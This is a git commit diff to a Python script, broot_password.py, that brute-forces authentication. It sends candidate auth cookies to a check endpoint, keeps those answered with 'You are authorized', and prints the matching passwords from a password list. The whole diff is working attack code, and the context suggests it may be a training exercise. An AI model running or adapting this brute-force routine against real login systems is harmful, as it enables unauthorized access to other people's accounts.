8693f7fab3c09d48f6e8b5614ee27f39760bde62
Alexander Maxyutenko <a750mr@gmail.com>
2022-03-05 21:34:04 +0300

    new function

--- broot_password.py
+++ broot_password.py
@@ -42,12 +42,30 @@ print(lscokie)
 
 
 def broot(cookie):
+    pass_cookies = []
     for i in cookie:
         one = str(i).split("=")[1]
-        headers = {'auth_cookie=': one}
-        response_broot = requests.post(check_cookie, headers=headers)
+        response_broot = requests.post(check_cookie, cookies={'auth_cookie': one})
         if response_broot.text == "You are authorized":
-            print(response_broot.text)
+            pass_cookies.append(one)
+    return pass_cookies
 
 
-broot(lscokie)
+pass_cookies = broot(lscokie)
+print(pass_cookies)
+
+cookie_ls = []
+for i in pass_cookies:
+    strokecook = f"auth_cookie={i}"
+    cookie_ls.append(strokecook)
+
+lsnumber = []
+for i in cookie_ls:
+    num = lscokie.index(i)
+    lsnumber.append(num)
+print(len(lscokie))
+print(len(pass_list))
+print(lsnumber)
+
+for i in lsnumber:
+    print(pass_list[i])
